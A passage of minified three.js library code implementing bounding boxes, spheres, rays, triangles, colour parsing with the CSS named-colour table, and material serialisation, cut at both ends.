r),this.isEmpty()?t.set(0,0,0):t.addVectors(this.min,this.max).multiplyScalar(.5)},getSize:function(t){return void 0===t&&(console.warn("THREE.Box3: .getSize() target is now required"),t=new r),this.isEmpty()?t.set(0,0,0):t.subVectors(this.max,this.min)},expandByPoint:function(t){return this.min.min(t),this.max.max(t),this},expandByVector:function(t){return this.min.sub(t),this.max.add(t),this},expandByScalar:function(t){return this.min.addScalar(-t),this.max.addScalar(t),this},expandByObject:function(t){var e;t.updateWorldMatrix(!1,!1);var i=t.geometry;if(void 0!==i)if(i.isGeometry){var n=i.vertices;for(i=0,e=n.length;i<e;i++)no.copy(n[i]),no.applyMatrix4(t.matrixWorld),this.expandByPoint(no)}else if(i.isBufferGeometry&&void 0!==(n=i.attributes.position))for(i=0,e=n.count;i<e;i++)no.fromBufferAttribute(n,i).applyMatrix4(t.matrixWorld),this.expandByPoint(no);for(i=0,e=(t=t.children).length;i<e;i++)this.expandByObject(t[i]);return this},containsPoint:function(t){return!(t.x<this.min.x||t.x>this.max.x||t.y<this.min.y||t.y>this.max.y||t.z<this.min.z||t.z>this.max.z)},containsBox:function(t){return this.min.x<=t.min.x&&t.max.x<=this.max.x&&this.min.y<=t.min.y&&t.max.y<=this.max.y&&this.min.z<=t.min.z&&t.max.z<=this.max.z},getParameter:function(t,e){return void 0===e&&(console.warn("THREE.Box3: .getParameter() target is now required"),e=new r),e.set((t.x-this.min.x)/(this.max.x-this.min.x),(t.y-this.min.y)/(this.max.y-this.min.y),(t.z-this.min.z)/(this.max.z-this.min.z))},intersectsBox:function(t){return!(t.max.x<this.min.x||t.min.x>this.max.x||t.max.y<this.min.y||t.min.y>this.max.y||t.max.z<this.min.z||t.min.z>this.max.z)},intersectsSphere:function(t){return this.clampPoint(t.center,no),no.distanceToSquared(t.center)<=t.radius*t.radius},intersectsPlane:function(t){if(0<t.normal.x)var e=t.normal.x*this.min.x,i=t.normal.x*this.max.x;else e=t.normal.x*this.max.x,i=t.normal.x*this.min.x;return 0<t.normal.y?(e+=t.normal.y*this.min.y,i+=t.normal.y*this.max.y):(e+=t.normal.y*this.max.y,i+=t.normal.y*this.min.y),0<t.normal.z?(e+=t.normal.z*this.min.z,i+=t.normal.z*this.max.z):(e+=t.normal.z*this.max.z,i+=t.normal.z*this.min.z),e<=-t.constant&&i>=-t.constant},intersectsTriangle:function(t){return!this.isEmpty()&&(this.getCenter(ho),uo.subVectors(this.max,ho),ro.subVectors(t.a,ho),ao.subVectors(t.b,ho),oo.subVectors(t.c,ho),so.subVectors(ao,ro),lo.subVectors(oo,ao),co.subVectors(ro,oo),!!g(t=[0,-so.z,so.y,0,-lo.z,lo.y,0,-co.z,co.y,so.z,0,-so.x,lo.z,0,-lo.x,co.z,0,-co.x,-so.y,so.x,0,-lo.y,lo.x,0,-co.y,co.x,0],ro,ao,oo,uo)&&(!!g(t=[1,0,0,0,1,0,0,0,1],ro,ao,oo,uo)&&(po.crossVectors(so,lo),g(t=[po.x,po.y,po.z],ro,ao,oo,uo))))},clampPoint:function(t,e){return void 0===e&&(console.warn("THREE.Box3: .clampPoint() target is now required"),e=new r),e.copy(t).clamp(this.min,this.max)},distanceToPoint:function(t){return no.copy(t).clamp(this.min,this.max).sub(t).length()},getBoundingSphere:function(t){return void 0===t&&console.error("THREE.Box3: .getBoundingSphere() target is now required"),this.getCenter(t.center),t.radius=.5*this.getSize(no).length(),t},intersect:function(t){return this.min.max(t.min),this.max.min(t.max),this.isEmpty()&&this.makeEmpty(),this},union:function(t){return this.min.min(t.min),this.max.max(t.max),this},applyMatrix4:function(t){return this.isEmpty()||(io[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(t),io[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(t),io[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(t),io[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(t),io[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(t),io[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(t),io[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(t),io[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(t),this.setFromPoints(io)),this},translate:function(t){return this.min.add(t),this.max.add(t),this},equals:function(t){return t.min.equals(this.min)&&t.max.equals(this.max)}});var mo=new m;Object.assign(v.prototype,{set:function(t,e){return this.center.copy(t),this.radius=e,this},setFromPoints:function(t,e){var i=this.center;void 0!==e?i.copy(e):mo.setFromPoints(t).getCenter(i);for(var n=e=0,r=t.length;n<r;n++)e=Math.max(e,i.distanceToSquared(t[n]));return this.radius=Math.sqrt(e),this},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.center.copy(t.center),this.radius=t.radius,this},empty:function(){return 0>=this.radius},containsPoint:function(t){return t.distanceToSquared(this.center)<=this.radius*this.radius},distanceToPoint:function(t){return t.distanceTo(this.center)-this.radius},intersectsSphere:function(t){var e=this.radius+t.radius;return t.center.distanceToSquared(this.center)<=e*e},intersectsBox:function(t){return t.intersectsSphere(this)},intersectsPlane:function(t){return Math.abs(t.distanceToPoint(this.center))<=this.radius},clampPoint:function(t,e){var i=this.center.distanceToSquared(t);return void 0===e&&(console.warn("THREE.Sphere: .clampPoint() target is now required"),e=new r),e.copy(t),i>this.radius*this.radius&&(e.sub(this.center).normalize(),e.multiplyScalar(this.radius).add(this.center)),e},getBoundingBox:function(t){return void 0===t&&(console.warn("THREE.Sphere: .getBoundingBox() target is now required"),t=new m),t.set(this.center,this.center),t.expandByScalar(this.radius),t},applyMatrix4:function(t){return this.center.applyMatrix4(t),this.radius*=t.getMaxScaleOnAxis(),this},translate:function(t){return this.center.add(t),this},equals:function(t){return t.center.equals(this.center)&&t.radius===this.radius}});var go=new r,vo=new r,yo=new r,xo=new r,bo=new r,wo=new r,_o=new r;Object.assign(y.prototype,{set:function(t,e){return this.origin.copy(t),this.direction.copy(e),this},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.origin.copy(t.origin),this.direction.copy(t.direction),this},at:function(t,e){return void 0===e&&(console.warn("THREE.Ray: .at() target is now required"),e=new r),e.copy(this.direction).multiplyScalar(t).add(this.origin)},lookAt:function(t){return this.direction.copy(t).sub(this.origin).normalize(),this},recast:function(t){return this.origin.copy(this.at(t,go)),this},closestPointToPoint:function(t,e){return void 0===e&&(console.warn("THREE.Ray: .closestPointToPoint() target is now required"),e=new r),e.subVectors(t,this.origin),0>(t=e.dot(this.direction))?e.copy(this.origin):e.copy(this.direction).multiplyScalar(t).add(this.origin)},distanceToPoint:function(t){return Math.sqrt(this.distanceSqToPoint(t))},distanceSqToPoint:function(t){var e=go.subVectors(t,this.origin).dot(this.direction);return 0>e?this.origin.distanceToSquared(t):(go.copy(this.direction).multiplyScalar(e).add(this.origin),go.distanceToSquared(t))},distanceSqToSegment:function(t,e,i,n){vo.copy(t).add(e).multiplyScalar(.5),yo.copy(e).sub(t).normalize(),xo.copy(this.origin).sub(vo);var r=.5*t.distanceTo(e),a=-this.direction.dot(yo),o=xo.dot(this.direction),s=-xo.dot(yo),l=xo.lengthSq(),c=Math.abs(1-a*a);if(0<c){e=a*o-s;var h=r*c;0<=(t=a*s-o)?e>=-h?e<=h?a=(t*=r=1/c)*(t+a*(e*=r)+2*o)+e*(a*t+e+2*s)+l:(e=r,a=-(t=Math.max(0,-(a*e+o)))*t+e*(e+2*s)+l):(e=-r,a=-(t=Math.max(0,-(a*e+o)))*t+e*(e+2*s)+l):e<=-h?a=-(t=Math.max(0,-(-a*r+o)))*t+(e=0<t?-r:Math.min(Math.max(-r,-s),r))*(e+2*s)+l:e<=h?(t=0,a=(e=Math.min(Math.max(-r,-s),r))*(e+2*s)+l):a=-(t=Math.max(0,-(a*r+o)))*t+(e=0<t?r:Math.min(Math.max(-r,-s),r))*(e+2*s)+l}else e=0<a?-r:r,a=-(t=Math.max(0,-(a*e+o)))*t+e*(e+2*s)+l;return i&&i.copy(this.direction).multiplyScalar(t).add(this.origin),n&&n.copy(yo).multiplyScalar(e).add(vo),a},intersectSphere:function(t,e){go.subVectors(t.center,this.origin);var i=go.dot(this.direction),n=go.dot(go)-i*i;return n>(t=t.radius*t.radius)?null:(n=i-(t=Math.sqrt(t-n)),i+=t,0>n&&0>i?null:0>n?this.at(i,e):this.at(n,e))},intersectsSphere:function(t){return this.distanceSqToPoint(t.center)<=t.radius*t.radius},distanceToPlane:function(t){var e=t.normal.dot(this.direction);return 0===e?0===t.distanceToPoint(this.origin)?0:null:0<=(t=-(this.origin.dot(t.normal)+t.constant)/e)?t:null},intersectPlane:function(t,e){return null===(t=this.distanceToPlane(t))?null:this.at(t,e)},intersectsPlane:function(t){var e=t.distanceToPoint(this.origin);return 0===e||0>t.normal.dot(this.direction)*e},intersectBox:function(t,e){var i=1/this.direction.x,n=1/this.direction.y,r=1/this.direction.z,a=this.origin;if(0<=i){var o=(t.min.x-a.x)*i;i*=t.max.x-a.x}else o=(t.max.x-a.x)*i,i*=t.min.x-a.x;if(0<=n){var s=(t.min.y-a.y)*n;n*=t.max.y-a.y}else s=(t.max.y-a.y)*n,n*=t.min.y-a.y;return o>n||s>i?null:((s>o||o!=o)&&(o=s),(n<i||i!=i)&&(i=n),0<=r?(s=(t.min.z-a.z)*r,t=(t.max.z-a.z)*r):(s=(t.max.z-a.z)*r,t=(t.min.z-a.z)*r),o>t||s>i?null:((s>o||o!=o)&&(o=s),(t<i||i!=i)&&(i=t),0>i?null:this.at(0<=o?o:i,e)))},intersectsBox:function(t){return null!==this.intersectBox(t,go)},intersectTriangle:function(t,e,i,n,r){if(bo.subVectors(e,t),wo.subVectors(i,t),_o.crossVectors(bo,wo),0<(e=this.direction.dot(_o))){if(n)return null;n=1}else{if(!(0>e))return null;n=-1,e=-e}return xo.subVectors(this.origin,t),0>(t=n*this.direction.dot(wo.crossVectors(xo,wo)))||0>(i=n*this.direction.dot(bo.cross(xo)))||t+i>e||0>(t=-n*xo.dot(_o))?null:this.at(t/e,r)},applyMatrix4:function(t){return this.origin.applyMatrix4(t),this.direction.transformDirection(t),this},equals:function(t){return t.origin.equals(this.origin)&&t.direction.equals(this.direction)}});var Mo=new r,So=new r,To=new r,Eo=new r,Co=new r,Ao=new r,Lo=new r,Po=new r,Ro=new r,Oo=new r;Object.assign(x,{getNormal:function(t,e,i,n){return void 0===n&&(console.warn("THREE.Triangle: .getNormal() target is now required"),n=new r),n.subVectors(i,e),Mo.subVectors(t,e),n.cross(Mo),0<(t=n.lengthSq())?n.multiplyScalar(1/Math.sqrt(t)):n.set(0,0,0)},getBarycoord:function(t,e,i,n,a){Mo.subVectors(n,e),So.subVectors(i,e),To.subVectors(t,e),t=Mo.dot(Mo),e=Mo.dot(So),i=Mo.dot(To);var o=So.dot(So);n=So.dot(To);var s=t*o-e*e;return void 0===a&&(console.warn("THREE.Triangle: .getBarycoord() target is now required"),a=new r),0===s?a.set(-2,-1,-1):(o=(o*i-e*n)*(s=1/s),t=(t*n-e*i)*s,a.set(1-o-t,t,o))},containsPoint:function(t,e,i,n){return x.getBarycoord(t,e,i,n,Eo),0<=Eo.x&&0<=Eo.y&&1>=Eo.x+Eo.y},getUV:function(t,e,i,n,r,a,o,s){return this.getBarycoord(t,e,i,n,Eo),s.set(0,0),s.addScaledVector(r,Eo.x),s.addScaledVector(a,Eo.y),s.addScaledVector(o,Eo.z),s},isFrontFacing:function(t,e,i,n){return Mo.subVectors(i,e),So.subVectors(t,e),0>Mo.cross(So).dot(n)}}),Object.assign(x.prototype,{set:function(t,e,i){return this.a.copy(t),this.b.copy(e),this.c.copy(i),this},setFromPointsAndIndices:function(t,e,i,n){return this.a.copy(t[e]),this.b.copy(t[i]),this.c.copy(t[n]),this},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.a.copy(t.a),this.b.copy(t.b),this.c.copy(t.c),this},getArea:function(){return Mo.subVectors(this.c,this.b),So.subVectors(this.a,this.b),.5*Mo.cross(So).length()},getMidpoint:function(t){return void 0===t&&(console.warn("THREE.Triangle: .getMidpoint() target is now required"),t=new r),t.addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)},getNormal:function(t){return x.getNormal(this.a,this.b,this.c,t)},getPlane:function(t){return void 0===t&&(console.warn("THREE.Triangle: .getPlane() target is now required"),t=new r),t.setFromCoplanarPoints(this.a,this.b,this.c)},getBarycoord:function(t,e){return x.getBarycoord(t,this.a,this.b,this.c,e)},getUV:function(t,e,i,n,r){return x.getUV(t,this.a,this.b,this.c,e,i,n,r)},containsPoint:function(t){return x.containsPoint(t,this.a,this.b,this.c)},isFrontFacing:function(t){return x.isFrontFacing(this.a,this.b,this.c,t)},intersectsBox:function(t){return t.intersectsTriangle(this)},closestPointToPoint:function(t,e){void 0===e&&(console.warn("THREE.Triangle: .closestPointToPoint() target is now required"),e=new r);var i=this.a,n=this.b,a=this.c;Co.subVectors(n,i),Ao.subVectors(a,i),Po.subVectors(t,i);var o=Co.dot(Po),s=Ao.dot(Po);if(0>=o&&0>=s)return e.copy(i);Ro.subVectors(t,n);var l=Co.dot(Ro),c=Ao.dot(Ro);if(0<=l&&c<=l)return e.copy(n);var h=o*c-l*s;if(0>=h&&0<=o&&0>=l)return n=o/(o-l),e.copy(i).addScaledVector(Co,n);Oo.subVectors(t,a),t=Co.dot(Oo);var u=Ao.dot(Oo);return 0<=u&&t<=u?e.copy(a):0>=(o=t*s-o*u)&&0<=s&&0>=u?(h=s/(s-u),e.copy(i).addScaledVector(Ao,h)):0>=(s=l*u-t*c)&&0<=c-l&&0<=t-u?(Lo.subVectors(a,n),h=(c-l)/(c-l+(t-u)),e.copy(n).addScaledVector(Lo,h)):(n=o*(a=1/(s+o+h)),h*=a,e.copy(i).addScaledVector(Co,n).addScaledVector(Ao,h))},equals:function(t){return t.a.equals(this.a)&&t.b.equals(this.b)&&t.c.equals(this.c)}});var Io={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074},zo={h:0,s:0,l:0},Do={h:0,s:0,l:0};Object.assign(b.prototype,{isColor:!0,r:1,g:1,b:1,set:function(t){return t&&t.isColor?this.copy(t):"number"==typeof t?this.setHex(t):"string"==typeof t&&this.setStyle(t),this},setScalar:function(t){return this.b=this.g=this.r=t,this},setHex:function(t){return t=Math.floor(t),this.r=(t>>16&255)/255,this.g=(t>>8&255)/255,this.b=(255&t)/255,this},setRGB:function(t,e,i){return this.r=t,this.g=e,this.b=i,this},setHSL:function(t,e,i){return t=Ca.euclideanModulo(t,1),e=Ca.clamp(e,0,1),i=Ca.clamp(i,0,1),0===e?this.r=this.g=this.b=i:(i=2*i-(e=.5>=i?i*(1+e):i+e-i*e),this.r=w(i,e,t+1/3),this.g=w(i,e,t),this.b=w(i,e,t-1/3)),this},setStyle:function(t){function e(e){void 0!==e&&1>parseFloat(e)&&console.warn("THREE.Color: Alpha component of "+t+" will be ignored.")}var i;if(i=/^((?:rgb|hsl)a?)\(\s*([^\)]*)\)/.exec(t)){var n=i[2];switch(i[1]){case"rgb":case"rgba":if(i=/^(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*(,\s*([0-9]*\.?[0-9]+)\s*)?$/.exec(n))return this.r=Math.min(255,parseInt(i[1],10))/255,this.g=Math.min(255,parseInt(i[2],10))/255,this.b=Math.min(255,parseInt(i[3],10))/255,e(i[5]),this;if(i=/^(\d+)%\s*,\s*(\d+)%\s*,\s*(\d+)%\s*(,\s*([0-9]*\.?[0-9]+)\s*)?$/.exec(n))return this.r=Math.min(100,parseInt(i[1],10))/100,this.g=Math.min(100,parseInt(i[2],10))/100,this.b=Math.min(100,parseInt(i[3],10))/100,e(i[5]),this;break;case"hsl":case"hsla":if(i=/^([0-9]*\.?[0-9]+)\s*,\s*(\d+)%\s*,\s*(\d+)%\s*(,\s*([0-9]*\.?[0-9]+)\s*)?$/.exec(n)){n=parseFloat(i[1])/360;var r=parseInt(i[2],10)/100,a=parseInt(i[3],10)/100;return e(i[5]),this.setHSL(n,r,a)}}}else if(i=/^#([A-Fa-f0-9]+)$/.exec(t)){if(3===(n=(i=i[1]).length))return this.r=parseInt(i.charAt(0)+i.charAt(0),16)/255,this.g=parseInt(i.charAt(1)+i.charAt(1),16)/255,this.b=parseInt(i.charAt(2)+i.charAt(2),16)/255,this;if(6===n)return this.r=parseInt(i.charAt(0)+i.charAt(1),16)/255,this.g=parseInt(i.charAt(2)+i.charAt(3),16)/255,this.b=parseInt(i.charAt(4)+i.charAt(5),16)/255,this}return t&&0<t.length&&(void 0!==(i=Io[t])?this.setHex(i):console.warn("THREE.Color: Unknown color "+t)),this},clone:function(){return new this.constructor(this.r,this.g,this.b)},copy:function(t){return this.r=t.r,this.g=t.g,this.b=t.b,this},copyGammaToLinear:function(t,e){return void 0===e&&(e=2),this.r=Math.pow(t.r,e),this.g=Math.pow(t.g,e),this.b=Math.pow(t.b,e),this},copyLinearToGamma:function(t,e){return void 0===e&&(e=2),e=0<e?1/e:1,this.r=Math.pow(t.r,e),this.g=Math.pow(t.g,e),this.b=Math.pow(t.b,e),this},convertGammaToLinear:function(t){return this.copyGammaToLinear(this,t),this},convertLinearToGamma:function(t){return this.copyLinearToGamma(this,t),this},copySRGBToLinear:function(t){return this.r=_(t.r),this.g=_(t.g),this.b=_(t.b),this},copyLinearToSRGB:function(t){return this.r=M(t.r),this.g=M(t.g),this.b=M(t.b),this},convertSRGBToLinear:function(){return this.copySRGBToLinear(this),this},convertLinearToSRGB:function(){return this.copyLinearToSRGB(this),this},getHex:function(){return 255*this.r<<16^255*this.g<<8^255*this.b<<0},getHexString:function(){return("000000"+this.getHex().toString(16)).slice(-6)},getHSL:function(t){void 0===t&&(console.warn("THREE.Color: .getHSL() target is now required"),t={h:0,s:0,l:0});var e,i=this.r,n=this.g,r=this.b,a=Math.max(i,n,r),o=Math.min(i,n,r),s=(o+a)/2;if(o===a)o=e=0;else{var l=a-o;switch(o=.5>=s?l/(a+o):l/(2-a-o),a){case i:e=(n-r)/l+(n<r?6:0);break;case n:e=(r-i)/l+2;break;case r:e=(i-n)/l+4}e/=6}return t.h=e,t.s=o,t.l=s,t},getStyle:function(){return"rgb("+(255*this.r|0)+","+(255*this.g|0)+","+(255*this.b|0)+")"},offsetHSL:function(t,e,i){return this.getHSL(zo),zo.h+=t,zo.s+=e,zo.l+=i,this.setHSL(zo.h,zo.s,zo.l),this},add:function(t){return this.r+=t.r,this.g+=t.g,this.b+=t.b,this},addColors:function(t,e){return this.r=t.r+e.r,this.g=t.g+e.g,this.b=t.b+e.b,this},addScalar:function(t){return this.r+=t,this.g+=t,this.b+=t,this},sub:function(t){return this.r=Math.max(0,this.r-t.r),this.g=Math.max(0,this.g-t.g),this.b=Math.max(0,this.b-t.b),this},multiply:function(t){return this.r*=t.r,this.g*=t.g,this.b*=t.b,this},multiplyScalar:function(t){return this.r*=t,this.g*=t,this.b*=t,this},lerp:function(t,e){return this.r+=(t.r-this.r)*e,this.g+=(t.g-this.g)*e,this.b+=(t.b-this.b)*e,this},lerpHSL:function(t,e){this.getHSL(zo),t.getHSL(Do),t=Ca.lerp(zo.h,Do.h,e);var i=Ca.lerp(zo.s,Do.s,e);return e=Ca.lerp(zo.l,Do.l,e),this.setHSL(t,i,e),this},equals:function(t){return t.r===this.r&&t.g===this.g&&t.b===this.b},fromArray:function(t,e){return void 0===e&&(e=0),this.r=t[e],this.g=t[e+1],this.b=t[e+2],this},toArray:function(t,e){return void 0===t&&(t=[]),void 0===e&&(e=0),t[e]=this.r,t[e+1]=this.g,t[e+2]=this.b,t},toJSON:function(){return this.getHex()}}),Object.assign(S.prototype,{clone:function(){return(new this.constructor).copy(this)},copy:function(t){this.a=t.a,this.b=t.b,this.c=t.c,this.normal.copy(t.normal),this.color.copy(t.color),this.materialIndex=t.materialIndex;for(var e=0,i=t.vertexNormals.length;e<i;e++)this.vertexNormals[e]=t.vertexNormals[e].clone();for(e=0,i=t.vertexColors.length;e<i;e++)this.vertexColors[e]=t.vertexColors[e].clone();return this}});var No=0;T.prototype=Object.assign(Object.create(e.prototype),{constructor:T,isMaterial:!0,onBeforeCompile:function(){},setValues:function(t){if(void 0!==t)for(var e in t){var i=t[e];if(void 0===i)console.warn("THREE.Material: '"+e+"' parameter is undefined.");else if("shading"===e)console.warn("THREE."+this.type+": .shading has been removed. Use the boolean .flatShading instead."),this.flatShading=1===i;else{var n=this[e];void 0===n?console.warn("THREE."+this.type+": '"+e+"' is not a property of this material."):n&&n.isColor?n.set(i):n&&n.isVector3&&i&&i.isVector3?n.copy(i):this[e]=i}}},toJSON:function(t){function e(t){var e,i=[];for(e in t){var n=t[e];delete n.metadata,i.push(n)}return i}var i=void 0===t||"string"==typeof t;i&&(t={textures:{},images:{}});var n={metadata:{version:4.5,type:"Material",generator:"Material.toJSON"}};return n.uuid=this.uuid,n.type=this.type,""!==this.name&&(n.name=this.name),this.color&&this.color.isColor&&(n.color=this.color.getHex()),void 0!==this.roughness&&(n.roughness=this.roughness),void 0!==this.metalness&&(n.metalness=this.metalness),this.emissive&&this.emissive.isColor&&(n.emissive=this.emissive.getHex()),this.emissiveIntensity&&1!==this.emissiveIntensity&&(n.emissiveIntensity=this.emissiveIntensity),this.specular&&this.specular.isColor&&(n.specular=this.specular.getHex()),void 0!==this.shininess&&(n.shininess=this.shininess),void 0!==this.clearcoat&&(n.clearcoat=this.clearcoat),void 0!==this.clearcoatRoughness&&(n.clearcoatRoughness=this.clearcoatRoughness),this.clearcoatNormalMap&&this.clearcoatNormalMap.isTexture&&(n.clearcoatNormalMap=this.clearcoatNormalMap.toJSON(t).uuid,n.clearcoatNormalScale=this.clearcoatNormalScale.toArray()),this.map&&this.map.isTexture&&(n.map=this.map.toJSON(t).uuid),this.matcap&&this.matcap.isTexture&&(n.matcap=this.matcap.toJSON(t).uuid),this.alphaMap&&this.alphaMap.isTexture&&(n.alphaMap=this.alphaMap.toJSON(t).uuid),this.lightMap&&this.lightMap.isTexture&&(n.lightMap=this.lightMap.toJSON(t).uuid),this.aoMap&&this.aoMap.isTexture&&(n.aoMap=this.aoMap.toJSON(t).uuid,n.aoMapIntensity=this.aoMapIntensity),this.bumpMap&&this.bumpMap.isTexture&&(n.bumpMap=this.bumpMap.toJSON(t).uuid,n.bumpScale=this.bumpScale),this.normalMap&&this.normalMap.isTexture&&(n.normalMap=this.normalMap.toJSON(t).uuid,n.normalMapType=this.normalMapType,n.normalScale=this.normalScale.toArray()),this.displacementMap&&this.displacementMap.isTexture&&(n.displacementMap=this.displacementMap.toJSON(t).uuid,n.displacementScale=this.displacementScale,n.displacementBias=this.displacementBias),this.roughnessMap&&this.roughnessMap.isTexture&&(n.roughnessMap=this.roughnessMap.toJSON(t).uuid),this.metalnessMap&&this.metalnessMap.isTexture&&(n.metalnessMap=this.metalnessMap.toJSON(t).uuid),this.emissiveMap&&this.emissiveMap.isTexture&&(n.emissiveMap=this.emissiveMap.toJSON(t).uuid),this.specularMap&&this.specularMap.isTexture&&(n.specularMap=this.specularMap.toJSON(t).uuid),this.envMap&&this.envMap.isTexture&&(n.envMap=this.envMap.toJSON(t).uuid,n.reflectivity=this.reflectivity,n.refractionRatio=this.refractionRatio,void 0!==this.combine&&(n.combine=this.combine),void 0!==this.envMapIntensity&&(n.envMapIntensity=this.envMapIntensity)),this.gradientMap&&this.gradientMap.isTexture&&(n.gradientMap=this.gradientMap.toJSON(t).uuid),void 0!==this.size&&(n.size=this.size),void 0!==this.sizeAttenuation&&(n.sizeAttenuation=this.sizeAttenuation),1!==this.blending&&(n.blending=this.blending),!0===this.flatShading&&(n.flatShading=this.flatShading),0!==this.side&&(n.side=this.side),0!==this.vertexColors&&(n.vertexColors=this.vertexColors),1>this.opacity&&(n.opacity=this.opacity),!0===this.transparent&&(n.transparent=this.transparent),n.depthFunc=this.depthFunc,n.depthTest=this.depthTest,n.depthWrite=this.depthWrite,n.stencilWrite=this.stencilWrite,n.stencilFunc=this.stencilFunc,n.stencilRef=this.stencilRef,n.stencilMask=this.stencilMask,n.stencilFail=this.stencilFail,n.stencilZFail=this.stencilZFail,n.stencilZPass=this.stencilZPass,this.rotation&&0!==this.rotation&&(n.rotation=this.rotation),!0===this.polygonOffset&&(n.polygonOffset=!0),0!==this.polygonOffsetFactor&&(n.polygonOffsetFactor=this.polygonOffsetFactor),0!==this.polygonOffsetUnits&&(n.polygonOffsetUnits=this.polygonOffsetUnits),this.linewidth&&1!==this.linewidth&&(n.linewidth=this.linewidth),void 0!==this.dashSize&&(n.dashSize=this.dashSize),void 0!==this.gapSize&&(n.gapSize=this.gapSize),void 0!==this.scale&&(n.scale=this.scale),!0===this.dithering&&(n.dithering=!0),0<this.alphaTest&&(n.alphaTest=this.alphaTest),!0===this.premultipliedAlpha&&(n.premultipliedAlpha=this.premultipliedAlpha),!0===this.wireframe&&(n.wireframe=this.wireframe),1<this.wireframeLinewidth&&(n.wireframeLinewidth=this.wireframeLinewidth),"round"!==this.wireframeLinecap&&(n.wireframeLinecap=this.wireframeLinecap),"round"!==this.wireframeLinejoin&&(n.wireframeLinejoin=this.wireframeLinejoin),!0===this.morphTargets&&(n.morphTargets=!0),!0===this.morphNormals&&(n.morphNormals=!0),!0===this.skinning&&(n.skinning=!0),!1===this.visible&&(n.visible=!1),!1===this.toneMapped&&(n.toneMapped=!1),"{}"!==JSON.stringify(this.userData)&&(n.userData=this.userData),i&&(i=e(t.textures),t=e(t.images),0<i.length&&(n.textures=i),0<t.length&&(n.images=t)),n},clone:function(){return(new this.constructor).copy(this)},copy:function(t){this.name=t.name,this.fog=t.fog,this.lights=t.lights,this.blending=t.blending,this.side=t.side,this.flatShading=t.flatShading,this.vertexColors=t.vertexColors,this.opacity=t.opacity,this.transparent=t.transparent,this.blendSrc=t.blendSrc,this.blendDst=t.blendDst,this.blendEquation=t.blendEquation,this.blendSrcAlpha=t.blendSrcAlpha,this.blendDstAlpha=t.blendDstAlpha,this.blendEquationAlpha=t.blendEquationAlpha,this.depthFunc=t.depthFunc,this.depthTest=t.depthTest,this.depthWrite=t.depthWrite,this.stencilWrite=t.stencilWrite,this.stencilFunc=t.stencilFunc,this.stencilRef=t.stencilRef,this.stencilMask=t.stencilMask,this.stencilFail=t.stencilFail,this.stencilZFail=t.stencilZFail,this.stencilZPass=t.stencilZPass,this.colorWrite=t.colorWrite,this.precision=t.precision,this.polygonOffset=t.polygonOffset,this.polygonOffsetFactor=t.polygonOffsetFactor,this.polygonOffsetUnits=t.polygonOffsetUnits,this.dithering=t.dithering,this.alphaTest=t.alphaTest,this.premultipliedAlpha=t.premultipliedAlpha,this.visible=t.visible,this.toneMapped=t.toneMapped,this.userData=JSON.parse(JSON.stringify(t.userData)),this.clipShadows=t.clipShadows,this.clipIntersection=t.clipIntersection;var e=t.clippingPlanes,i=null;if(null!==e){var n=e.length;i=Array(n);for(var r=0;r!==n;++r)i[r]=e[r].clone()}return 